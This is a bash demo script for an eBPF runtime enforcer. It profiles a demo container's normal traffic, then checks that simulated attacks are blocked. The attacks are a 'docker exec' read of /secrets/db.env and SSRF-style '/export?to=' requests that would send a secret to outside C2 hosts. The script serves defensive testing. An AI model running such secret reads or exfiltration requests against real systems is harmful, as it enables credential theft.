#!/usr/bin/env bash
#
# DATA-EXFILTRATION demo against secretsvc.
#
# Fires the /export?to=<C2> attack (secret read + egress) and also a direct
# docker-exec secret read. Under a profile learned from / + /orders only:
#   - / and /orders keep working
#   - reading /secrets/db.env and egress to an un-profiled C2 are denied
#
# Prereq: secretsvc is running AND ebpf-mon is enforcing its profile.
# Full flow (also automated by docs/demo/run-demo.sh):
#   1. docs/demo/setup.sh                                # builds + profiles
#   2. sudo target/release/ebpf-mon --name secretsvc \
#        --enforce docs/demo/secretsvc-events.json
#   3. ./docs/demo/exfil-demo.sh                         # <-- this script
#
# Usage:  ./exfil-demo.sh [host:port] [--warmup]
set -uo pipefail
TARGET="${1:-127.0.0.1:8081}"
BAD_IP="${BAD_IP:-93.184.216.34}"     # endpoint NOT in the profile (exfil/C2)
CONTAINER="${CONTAINER:-secretsvc}"
G='\033[0;32m'; R='\033[0;31m'; Y='\033[1;33m'; B='\033[1;36m'; D='\033[0;90m'; NC='\033[0m'

# --- kernel receipts ---------------------------------------------------------
# When launched by run-demo.sh, ENFORCE_LOG points at the live ebpf-mon log; we
# surface the enforcer's own ENFORCEMENT DENY/AUDIT line under each attack so a
# block is backed by independent kernel evidence, not just an empty/failed HTTP
# response. No-ops when ENFORCE_LOG is unset (standalone runs).
logn() { { [ -n "${ENFORCE_LOG:-}" ] && [ -f "${ENFORCE_LOG:-}" ] && wc -l <"$ENFORCE_LOG" 2>/dev/null; } || echo 0; }
receipt() {
    [ -n "${ENFORCE_LOG:-}" ] && [ -f "${ENFORCE_LOG:-}" ] || return 0
    local start="${1:-0}" hit tries=0
    while [ "$tries" -lt 8 ]; do
        hit="$(tail -n "+$((start + 1))" "$ENFORCE_LOG" 2>/dev/null \
               | grep -aoE 'ENFORCEMENT (DENY|AUDIT).*' | head -n 3)"
        [ -n "$hit" ] && break
        sleep 0.25; tries=$((tries + 1))
    done
    [ -n "$hit" ] || return 0
    while IFS= read -r line; do
        echo -e "${D}    \xE2\x86\xB3 kernel: ${line}${NC}"
    done <<<"$hit"
}

# --warmup: generate ONLY the legit traffic to profile (run this during setup.sh).
# Hits / and /orders exclusively so the learned profile is a *tight* allow-list
# (/orders reads /data/orders.json); reading /secrets/db.env and egress to an
# un-profiled C2 then fall outside it. Duration honors WARMUP_SECS.
if [ "${2:-}" = "--warmup" ] || [ "${1:-}" = "--warmup" ]; then
    if [ "${1:-}" = "--warmup" ]; then TARGET="${2:-127.0.0.1:8081}"; fi
    SECS="${WARMUP_SECS:-20}"
    for _ in $(seq 1 40); do curl -sf -m 1 "http://$TARGET/" >/dev/null 2>&1 && break; sleep 0.25; done
    echo -e "${B}[warmup] legit traffic for profiling (${SECS}s): / + /orders${NC}"
    end=$((SECONDS+SECS)); n=0
    while [ $SECONDS -lt $end ]; do
        curl -s -m 2 "http://$TARGET/"       >/dev/null 2>&1
        curl -s -m 2 "http://$TARGET/orders" >/dev/null 2>&1   # reads /data/orders.json
        n=$((n+2)); sleep 0.25
    done
    echo "[warmup] done — sent ~$n legit requests."
    exit 0
fi

# expect_serving <label> <path> [note]
# The app's OWN health check, styled like the attack lines for parity. It hits a
# real HTTP endpoint so the APP process performs its profiled in-process open
# (e.g. GET /orders -> the app reads /data/orders.json itself). Green SERVING =
# the legit path still works under enforcement (no false positive); red FAILED =
# the app's own work was blocked. This is the faithful health test — NOT `docker
# exec cat`, which would drag in un-profiled /bin/sh + /bin/cat and be denied.
expect_serving() {
    local label="$1" path="$2" note="${3:-}" resp code body
    resp="$(curl -s -m 5 -w $'\n%{http_code}' "http://$TARGET$path" 2>/dev/null || true)"
    code="${resp##*$'\n'}"
    body="$(printf '%s' "${resp%$'\n'*}" | head -c 56 | tr -d '\n')"
    if [ "$code" = "200" ]; then
        echo -e "  ${G}SERVING  ${NC} $label   ${D}(HTTP $code${note:+ — $note})${NC}"
        [ -n "$body" ] && echo -e "${D}    -> ${body}${NC}"
    else
        echo -e "  ${R}FAILED   ${NC} $label   ${Y}(HTTP ${code:-timeout} — false positive?)${NC}"
    fi
}

# HTTP-level attack. Distinction matters for honest demos:
#   LEAKED    = secret was read and an exfil attempt was made
#               (body says "exfiltrated ..." OR "exfil to ... failed")
#   CONTAINED = secret read denied, or the request never completed
expect_contained() {
    local label="$1" url="$2" out code body start
    start="$(logn)"
    out="$(curl -s -m 5 -w '\n%{http_code}' "$url" 2>/dev/null || true)"
    code="$(printf '%s' "$out" | tail -n1)"
    body="$(printf '%s' "$out" | sed '$d')"
    if printf '%s' "$body" | grep -qiE 'exfiltrated|exfil to .+ failed'; then
        echo -e "  ${R}LEAKED   ${NC}  $label   ${Y}(secret left the process)${NC}"
        echo -e "${D}    -> ${body%%$'\n'*}${NC}"
    elif printf '%s' "$body" | grep -qiE 'secret read failed'; then
        echo -e "  ${G}CONTAINED${NC}  $label   ${D}(secret read denied)${NC}"
    elif [ -z "$code" ] || [ "$code" = "000" ] || [ -z "${body//[$'\t\r\n ']/}" ]; then
        echo -e "  ${G}CONTAINED${NC}  $label   ${D}(request blocked / empty)${NC}"
    else
        # Any other non-success response under live enforce is containment.
        echo -e "  ${G}CONTAINED${NC}  $label   ${D}(http=$code)${NC}"
    fi
    receipt "$start"
}

# docker-exec secret read: expect FAIL under live enforcement
expect_blocked_exec() {
    local label="$1" start; shift
    start="$(logn)"
    if docker exec "$CONTAINER" sh -c "$*" >/dev/null 2>&1; then
        echo -e "  ${R}ALLOWED ${NC}  $label   ${Y}(enforcement miss)${NC}"
    else
        echo -e "  ${G}BLOCKED ${NC}  $label"
    fi
    receipt "$start"
}

echo -e "${B}== Data exfil against $TARGET (profile ENFORCED) ==${NC}"

echo -e "\n${B}[0] The app's own work — expect SERVING (no false positives)${NC}"
expect_serving "GET /"       "/"       "liveness"
expect_serving "GET /orders" "/orders" "app reads /data/orders.json in-process"

echo -e "\n${B}[1] Direct secret loot via docker exec  -> FILE read denied${NC}"
expect_blocked_exec "cat /secrets/db.env" "cat /secrets/db.env"

echo -e "\n${B}[2] SSRF-style /export to un-profiled C2 -> secret read + EGRESS denied${NC}"
expect_contained "POST secret to $BAD_IP" "http://$TARGET/export?to=$BAD_IP"

echo -e "\n${B}[3] Same export to another un-profiled host${NC}"
expect_contained "POST secret to 1.1.1.1" "http://$TARGET/export?to=1.1.1.1"

echo -e "\n${D}Cross-check the deny events in ebpf-mon's audit log. In --audit-only mode${NC}"
echo -e "${D}these would all SUCCEED but each denial would still be logged.${NC}"
